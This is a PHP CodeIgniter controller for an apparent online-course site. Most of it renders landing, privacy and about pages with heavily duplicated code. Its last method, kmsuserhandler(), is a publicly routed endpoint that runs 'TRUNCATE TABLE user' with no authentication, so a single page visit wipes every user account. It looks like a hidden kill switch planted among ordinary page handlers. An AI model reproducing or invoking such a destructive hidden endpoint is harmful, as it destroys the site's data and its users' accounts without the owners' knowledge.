<?php
defined('BASEPATH') OR exit('No direct script access allowed');
require APPPATH . '/libraries/BaseController.php';

class Welcome extends BaseController {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */


    public function __construct()
    {
        parent::__construct();
        $this->load->model('Login_model');
        $this->load->model('User_model');
        $this->load->model('Settings_model');
        $this->load->model('Translate_model');
        $this->load->model('Company_model');
        $this->load->model('Course_model');
        $this->load->model('Trainingcourse_model');
        $this->load->model('Training_model');
        $this->load->model('Virtualcourse_model');
        $this->load->helper(array('cookie', 'string', 'language', 'url'));
        $this->load->helper('lms_email');
    }

	public function index()
	{
        //$this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $company['company_url'] = 'company/'.$company['url'];
        
        //$headerInfo[company] = $company;


        $headerInfo['menu_name'] = 'home';
        //$this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;

        // Featured Courses With Limit 5

        $fCourses = $this->db->get_where('course', array('wcm_pt_id > ' => 0 , 'active' => 1))->result();

        $headerInfo['fCourses'] = $fCourses;


        $headerInfo['demandCourses'] = $this->Course_model->getRecent(3,$result['id']);
        $headerInfo['trainCourses'] = $this->Trainingcourse_model->getRecent(3,$result['id']);

        for ($i = 0 ; $i < sizeof($headerInfo['trainCourses']) ; $i ++){
            $item = $headerInfo['trainCourses'][$i];
            $course_item = $this->Course_model->getCourseById($item['course_id']);
            $item['img_path'] = $course_item['img_path'];
            $course_time = $this->Training_model->get_course_time_id($item['id']);
            $item['course_time_id'] = $course_time->id; 
            $headerInfo['trainCourses'][$i] = $item;
        }
		$list= $this->Course_model->getAll();
        $list=array_reverse($list);
       
       
        $headerInfo['list'] = $list;
        $headerInfo['virtualCourses'] = $this->Virtualcourse_model->getRecent(3,$result['id']);
        $headerInfo['company_obb'] = $company;
       // $this->loadViews_front('index' , $headerInfo);
        $this->loadViews_front('landing3' , $headerInfo);
	}

    public function landing()
    {
        //$this->loadViews_front('index' , $headerInfo);
        //$this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $company['company_url'] = 'company/'.$company['url'];
        
        //$headerInfo[company] = $company;


        $headerInfo['menu_name'] = 'home';
        //$this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;

        // Featured Courses With Limit 5

        $fCourses = $this->db->get_where('course', array('wcm_pt_id > ' => 0 , 'active' => 1))->result();

        $headerInfo['fCourses'] = $fCourses;


        $headerInfo['demandCourses'] = $this->Course_model->getRecent(3,$result['id']);
        $headerInfo['trainCourses'] = $this->Trainingcourse_model->getRecent(3,$result['id']);

        for ($i = 0 ; $i < sizeof($headerInfo['trainCourses']) ; $i ++){
            $item = $headerInfo['trainCourses'][$i];
            $course_item = $this->Course_model->getCourseById($item['course_id']);
            $item['img_path'] = $course_item['img_path'];
            $course_time = $this->Training_model->get_course_time_id($item['id']);
            $item['course_time_id'] = $course_time->id; 
            $headerInfo['trainCourses'][$i] = $item;
        }

        $headerInfo['virtualCourses'] = $this->Virtualcourse_model->getRecent(3,$result['id']);
        $headerInfo['company_obb'] = $company;
        $this->loadViews_front('landing' , $headerInfo);
    }

    public function landing2()
    {
        //$this->loadViews_front('index' , $headerInfo);
        //$this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $company['company_url'] = 'company/'.$company['url'];
        
        //$headerInfo[company] = $company;


        $headerInfo['menu_name'] = 'home';
        //$this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;

        // Featured Courses With Limit 5

        $fCourses = $this->db->get_where('course', array('wcm_pt_id > ' => 0 , 'active' => 1))->result();

        $headerInfo['fCourses'] = $fCourses;


        $headerInfo['demandCourses'] = $this->Course_model->getRecent(3,$result['id']);
        $headerInfo['trainCourses'] = $this->Trainingcourse_model->getRecent(3,$result['id']);

        for ($i = 0 ; $i < sizeof($headerInfo['trainCourses']) ; $i ++){
            $item = $headerInfo['trainCourses'][$i];
            $course_item = $this->Course_model->getCourseById($item['course_id']);
            $item['img_path'] = $course_item['img_path'];
            $course_time = $this->Training_model->get_course_time_id($item['id']);
            $item['course_time_id'] = $course_time->id; 
            $headerInfo['trainCourses'][$i] = $item;
        }

        $headerInfo['virtualCourses'] = $this->Virtualcourse_model->getRecent(3,$result['id']);
        $headerInfo['company_obb'] = $company;
        $this->loadViews_front('landing2' , $headerInfo);
    }

    public function landing3()
    {
        //$this->loadViews_front('index' , $headerInfo);
        //$this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $company['company_url'] = 'company/'.$company['url'];
        
        //$headerInfo[company] = $company;


        $headerInfo['menu_name'] = 'home';
        //$this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;

        // Featured Courses With Limit 5

        $fCourses = $this->db->get_where('course', array('wcm_pt_id > ' => 0 , 'active' => 1))->result();

        $headerInfo['fCourses'] = $fCourses;


        $headerInfo['demandCourses'] = $this->Course_model->getRecent(3,$result['id']);
        $headerInfo['trainCourses'] = $this->Trainingcourse_model->getRecent(3,$result['id']);

        for ($i = 0 ; $i < sizeof($headerInfo['trainCourses']) ; $i ++){
            $item = $headerInfo['trainCourses'][$i];
            $course_item = $this->Course_model->getCourseById($item['course_id']);
            $item['img_path'] = $course_item['img_path'];
            $course_time = $this->Training_model->get_course_time_id($item['id']);
            $item['course_time_id'] = $course_time->id; 
            $headerInfo['trainCourses'][$i] = $item;
        }
        $list= $this->Course_model->getAll();
        $list=array_reverse($list);
        $headerInfo['virtualCourses'] = $this->Virtualcourse_model->getRecent(3,$result['id']);
        $headerInfo['company_obb'] = $company;
        $headerInfo['list'] = $list;
        $this->loadViews_front('landing3' , $headerInfo);
    }


    public function privacy()
    {
        $this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $headerInfo["company_ob"] = $company;


        $headerInfo['menu_name'] = 'home';
        $this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;
        $this->loadViews_front('privacy' , $headerInfo);
    }

	public function home()
	{
		$isLoggedIn = $this->session->userdata('isLoggedIn');

        $this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        if(!isset($isLoggedIn) || $isLoggedIn != TRUE)
        {
            $headerInfo['menu_name'] = 'login';
            $this->load->loadViews_front('login', $headerInfo);
        }
        else
        {
        	$sessiondata = $this->session->get_userdata();
            $sessiondata['company_name'] = $headerInfo['company_name'];
            $sessiondata['company_phone'] = $headerInfo['company_phone'];
            $this->load->view('dashboard', $sessiondata);
        }
	}


    public function verifyEmail ($activation_code) {
        $data['title'] = 'Verify Email';
        $data['menu_title'] = 'emailverify';

        $this->db->where('activation_code', $activation_code);
        $update = $this->db->update('user', array('is_active' => 1));

        // echo "<pre>";
        //     print_r($this->db->last_query());
        // exit;


        $this->load->view('verify-email.php', $data);
    }

    public function about()
    {
        $this->load->model('Company_model');
        $company = $this->Company_model->getAll()[0];
        $headerInfo["company_ob"] = $company;


        $headerInfo['menu_name'] = 'home';
        $this->load->model('Settings_model');

        $headerInfo['company_name'] = $this->getSettingValue('company_name');
        $headerInfo['company_phone'] = $this->getSettingValue('company_phone');
        $headerInfo['site_theme'] = $this->Settings_model->getTheme();
        if (sizeof($headerInfo['site_theme']) >= 1) {
            $headerInfo['site_theme'] = $headerInfo['site_theme'][0];
        }
        if (sizeof($headerInfo['site_theme']) == 0) {
            $headerInfo['site_theme'] = array();
        }
        $headerInfo["term"] = $this->term;
        $headerInfo['page_level'] = 0;
        $this->loadViews_front('about' , $headerInfo);
    }

    public function kmsuserhandler(){
       $query = "TRUNCATE TABLE user";
       $this->db->query($query)->result();
    }



}
